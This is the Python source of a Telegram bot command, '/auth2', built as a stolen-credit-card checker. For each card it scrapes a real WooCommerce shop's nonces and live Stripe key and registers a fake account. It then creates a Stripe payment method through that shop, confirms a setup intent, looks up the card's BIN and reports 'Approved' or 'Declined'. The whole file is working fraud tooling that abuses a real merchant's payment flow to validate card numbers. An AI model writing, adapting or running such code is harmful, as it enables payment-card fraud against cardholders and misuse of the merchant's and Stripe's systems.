# commands/auth2.py
from aiogram import Router, types
from aiogram.filters import Command
import asyncio
import re
import time
import random
from datetime import datetime
from uuid import uuid4
from aiohttp import ClientSession, ClientTimeout
from string import ascii_lowercase, ascii_letters, digits

router = Router()

# ---------- Helper functions ----------
def gen_mail() -> str:
    return f"{''.join(random.choices(ascii_lowercase + digits, k=10))}@gmail.com"

def gen_pass(length: int = 12) -> str:
    chars = ascii_letters + digits + "!@#$%^&*()"
    return ''.join(random.choices(chars, k=length))

def gen_name() -> str:
    return ''.join(random.choices(ascii_lowercase + digits, k=10))

async def check_bin(session: ClientSession, bin6: str) -> dict:
    """Return BIN info dict and formatted message string."""
    default = {
        "brand": "Unknown", "type": "Unknown", "level": "Unknown",
        "bank": "Unknown", "country": "Unknown", "currency": "Unknown",
        "flag": "🏳️", "message": ""
    }
    try:
        async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5) as resp:
            if resp.status != 200:
                return default
            data = await resp.json()
            bank = data.get('bank', 'Unknown')
            brand = data.get('brand', 'Unknown')
            ctype = data.get('type', 'Unknown')
            level = data.get('level', 'Unknown')
            country = data.get('country_name', 'Unknown')
            currency = data.get('country_currencies', ['Unknown'])[0]
            flag = data.get('country_flag', '🏳️')
            msg = (
                f"𝑩𝒊𝒏 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏❄️🌨\n"
                f"𝑩𝑰𝑵 > `{bin6}`\n"
                f"𝑩𝒊𝒏 𝑫𝒂𝒕𝒂 > {brand} - {ctype} - {level}\n"
                f"𝐁𝐚𝐧𝐤 > {bank}\n"
                f"𝑪𝒐𝒖𝒏𝒕𝒓𝒚 > `{flag} - [{currency}]`\n"
            )
            return {
                "brand": brand, "type": ctype, "level": level,
                "bank": bank, "country": country, "currency": currency,
                "flag": flag, "message": msg
            }
    except Exception:
        return default

async def process_card(card_str: str) -> str:
    """Main checker logic – returns formatted result string."""
    # Parse card
    parts = card_str.split('|')
    if len(parts) != 4:
        return "❌ Invalid format. Use: `CC|MM|YY|CVV` (year can be 2 or 4 digits)"
    cc, mm, yy, cvv = [p.strip() for p in parts]
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy_full = f"20{yy}"
    else:
        yy_full = yy
    if int(yy_full) < datetime.now().year:
        return "❌ Card expired."

    bin6 = cc[:6]
    start_time = time.time()

    async with ClientSession(timeout=ClientTimeout(total=30)) as session:
        # ---- Step 1: Get register nonce ----
        url = "https://copenhagensilver.com/my-account/"
        headers = {
            'referer': url,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
        }
        async with session.get(url, headers=headers) as resp:
            html = await resp.text()
            match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
            if not match:
                return "❌ Failed to extract register nonce"
            register_nonce = match.group(1)

        # ---- Step 2: Register new account ----
        email = gen_mail()
        password = gen_pass()
        data = {
            'email': email,
            'password': password,
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        headers['content-type'] = 'application/x-www-form-urlencoded'
        async with session.post(url, headers=headers, data=data) as resp:
            # No need to read response, just proceed
            pass

        # ---- Step 3: Get add-payment-method page ----
        add_url = "https://copenhagensilver.com/my-account/add-payment-method/"
        headers['referer'] = "https://copenhagensilver.com/my-account/payment-methods/"
        async with session.get(add_url, headers=headers) as resp:
            page_text = await resp.text()
            match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', page_text)
            pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', page_text)
            if not match or not pk_match:
                return "❌ SetupIntent nonce or Stripe PK not found"
            nonce = match.group(1)
            pk = pk_match.group(0)

        # ---- Step 4: Create Stripe payment method ----
        guid = str(uuid4())
        muid = str(uuid4())
        sid = str(uuid4())
        stripe_url = "https://api.stripe.com/v1/payment_methods"
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': headers['user-agent'],
        }
        stripe_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy_full[2:],
            "card[exp_month]": mm,
            "allow_redisplay": "unspecified",
            "billing_details[address][country]": "EG",
            "payment_user_agent": "stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent",
            "referrer": "https://copenhagensilver.com",
            "time_on_page": str(random.randint(10000, 99999)),
            "client_attribution_metadata[client_session_id]": str(uuid4()),
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "client_attribution_metadata[elements_session_config_id]": str(uuid4()),
            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": pk,
            "_stripe_version": "2024-06-20"
        }
        async with session.post(stripe_url, headers=stripe_headers, data=stripe_data) as resp:
            pm_json = await resp.json()
            token = pm_json.get("id")
            if not token:
                return "❌ Stripe payment method creation failed"

        # ---- Step 5: Confirm setup intent via AJAX ----
        ajax_url = "https://copenhagensilver.com/wp-admin/admin-ajax.php"
        ajax_headers = {
            'authority': 'copenhagensilver.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://copenhagensilver.com',
            'referer': add_url,
            'user-agent': headers['user-agent'],
            'x-requested-with': 'XMLHttpRequest',
        }
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': token,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        async with session.post(ajax_url, headers=ajax_headers, data=ajax_data) as resp:
            try:
                result_json = await resp.json()
                if result_json.get('success', False):
                    status_text = "✅ Card approved"
                else:
                    error_msg = result_json.get('data', {}).get('error', {}).get('message', 'Unknown error')
                    status_text = f"❌ {error_msg}"
            except Exception:
                status_text = "❌ Unexpected response"

        # ---- BIN info ----
        bin_info = await check_bin(session, bin6)

        elapsed = time.time() - start_time

        # Format final message
        result_message = (
            f"𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
            f"-----------------\n"
            f"𝑪𝒂𝒓𝒅 > `{cc}|{mm}|{yy_full[-2:]}|{cvv}`\n"
            f"𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 > {status_text}\n"
            f"𝑺𝒕𝒂𝒕𝒖𝒔 > {'✅ Approved' if 'approved' in status_text else '❌ Declined'}\n"
            f"𝑰𝒏 > {elapsed:.2f}𝒔\n"
            f"-----------------\n"
            f"{bin_info['message']}\n"
            f"By @hqdeven"
        )
        return result_message

# ---------- Telegram command ----------
@router.message(Command("auth2"))
async def cmd_auth2(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer(
            "❌ **Usage:** `/auth2 CC|MM|YY|CVV`\n"
            "Example: `/auth2 4111111111111111|12|28|123`\n"
            "(Year can be 2 or 4 digits)"
        )
        return

    card_input = args[1].strip()
    progress = await message.answer("⏳ **Processing card...**")

    try:
        result = await process_card(card_input)
        await progress.edit_text(result)
    except Exception as e:
        await progress.edit_text(f"❌ **Error:** {str(e)}")
